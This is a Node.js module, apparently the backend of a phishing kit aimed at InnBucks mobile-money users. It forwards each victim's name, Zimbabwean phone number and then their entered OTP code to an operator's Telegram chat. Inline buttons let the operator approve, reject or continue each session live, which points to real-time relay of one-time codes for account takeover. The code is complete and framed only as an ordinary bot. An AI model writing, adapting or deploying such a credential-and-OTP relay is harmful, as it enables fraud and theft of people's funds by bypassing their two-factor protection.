// innbucks.js - equivalent of innbucks.php
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const SESSIONS_DIR = path.join(__dirname, 'sessions');

// Make sure sessions folder exists
if (!fs.existsSync(SESSIONS_DIR)) {
  fs.mkdirSync(SESSIONS_DIR);
}

class InnBucksBot {
  constructor(token, adminId) {
    this.botToken = token;
    this.adminChatId = adminId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}/`;
    this.lastUpdateId = 0;
  }

  // Equivalent of sendRequest() in PHP
  async sendRequest(method, data = {}) {
    const url = this.apiUrl + method;
    try {
      const params = new URLSearchParams(data);
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params.toString()
      });
      return await response.json();
    } catch (err) {
      console.error(`Telegram API error [${method}]:`, err.message);
      return null;
    }
  }

  // Equivalent of generateSessionId() in PHP
  generateSessionId(phone) {
    const raw = phone + Date.now() + crypto.randomBytes(8).toString('hex');
    return crypto.createHash('md5').update(raw).digest('hex');
  }

  // Equivalent of pollUpdates() in PHP
  async pollUpdates() {
    const result = await this.sendRequest('getUpdates', {
      offset: this.lastUpdateId + 1,
      timeout: 1
    });

    if (result && result.ok && result.result && result.result.length > 0) {
      for (const update of result.result) {
        this.lastUpdateId = update.update_id;

        if (update.callback_query) {
          await this.handleCallback(update.callback_query);
        }
      }
      return true;
    }
    return false;
  }

  // Equivalent of sendLoginAlert() in PHP
  async sendLoginAlert(firstName, lastName, phone) {
    const fullName = `${firstName} ${lastName}`.trim();
    const sessionId = this.generateSessionId(phone);
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);

    const keyboard = {
      inline_keyboard: [
        [
          { text: '🔑 Request OTP', callback_data: `otp_request_${sessionId}` }
        ]
      ]
    };

    const message =
      `🔐 *New Login Attempt*\n\n` +
      `👤 *Name:* ${fullName}\n` +
      `📱 *Phone:* +263 ${phone}\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Click below to allow OTP entry:`;

    await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });

    return {
      success: true,
      sessionId: sessionId
    };
  }

  // Equivalent of sendOtpAlert() in PHP
  async sendOtpAlert(sessionId, otp) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);

    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ Wrong Code', callback_data: `wrong_${sessionId}` },
          { text: '✅ Continue', callback_data: `continue_${sessionId}` }
        ]
      ]
    };

    const message =
      `🔑 *OTP Entered*\n\n` +
      `🔢 *OTP Code:* \`${otp}\`\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Choose action:`;

    return await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });
  }

  // Equivalent of handleCallback() in PHP
  async handleCallback(callbackQuery) {
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;

    if (data.startsWith('otp_request_')) {
      const sessionId = data.replace('otp_request_', '');
      fs.writeFileSync(path.join(SESSIONS_DIR, `${sessionId}.txt`), 'approved');

      await this.sendRequest('answerCallbackQuery', {
        callback_query_id: callbackId
      });

    } else if (data.startsWith('wrong_')) {
      const sessionId = data.replace('wrong_', '');
      fs.writeFileSync(path.join(SESSIONS_DIR, `${sessionId}.txt`), 'wrong_code');

      await this.sendRequest('answerCallbackQuery', {
        callback_query_id: callbackId
      });

    } else if (data.startsWith('continue_')) {
      const sessionId = data.replace('continue_', '');
      fs.writeFileSync(path.join(SESSIONS_DIR, `${sessionId}.txt`), 'continue');

      await this.sendRequest('answerCallbackQuery', {
        callback_query_id: callbackId
      });
    }

    return true;
  }

  // Equivalent of getSessionStatus() in PHP
  getSessionStatus(sessionId) {
    const file = path.join(SESSIONS_DIR, `${sessionId}.txt`);
    if (fs.existsSync(file)) {
      const status = fs.readFileSync(file, 'utf8').trim();
      fs.unlinkSync(file); // delete after reading, same as PHP unlink()
      return status;
    }
    return 'pending';
  }
}

module.exports = InnBucksBot;
